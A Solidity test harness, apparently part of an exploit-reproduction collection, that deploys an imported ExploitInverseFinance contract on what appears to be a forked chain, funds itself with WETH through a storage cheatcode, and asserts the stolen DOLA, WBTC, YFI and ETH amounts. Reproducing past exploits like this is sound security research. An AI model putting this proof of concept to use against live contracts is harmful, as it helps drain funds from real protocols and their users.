// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "ds-test/test.sol";

import { ExploitInverseFinance } from "./ExploitInverseFinance.sol";

interface Vm {
    function store(address c, bytes32 loc, bytes32 val) external;
    function roll(uint x) external;
}

interface ERC20 {
    function approve(address spender, uint256 amount) external;
    function balanceOf(address user) external returns (uint256);
}

contract ExploitInverseFinanceTest is DSTest {

    ERC20 private weth = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ERC20 private inv  = ERC20(0x41D5D79431A913C4aE7d69a668ecdfE5fF9DFB68);
    ERC20 private dola = ERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4); // 0
    ERC20 private usdc = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // 2
    ERC20 private wbtc = ERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    ERC20 private yfi  = ERC20(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e);

    Vm    private vm   = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {}

    function sendWETH(address to, uint256 amount) internal {
        vm.store(address(weth), keccak256(abi.encode(to, 3)), bytes32(amount));
    }

    function testReproduce() public {
        // Deploy the exploit contract
        ExploitInverseFinance exploit = new ExploitInverseFinance();

        // Top up the account balance
        sendWETH(address(this), 500 ether);

        // Reproduce the exploit
        weth.approve(address(exploit), 500 ether);
        uint256 prevBalance = address(this).balance;
        exploit.reproduce();

        // Check the exploit returns
        assertEq(dola.balanceOf(address(this)), 3_999_699 * 1e18);
        assertEq(wbtc.balanceOf(address(this)), 94 * 1e8);
        assertEq(yfi.balanceOf(address(this)), 39 * 1e18);
        assertEq(address(this).balance, prevBalance + 1588 ether);
    }
}
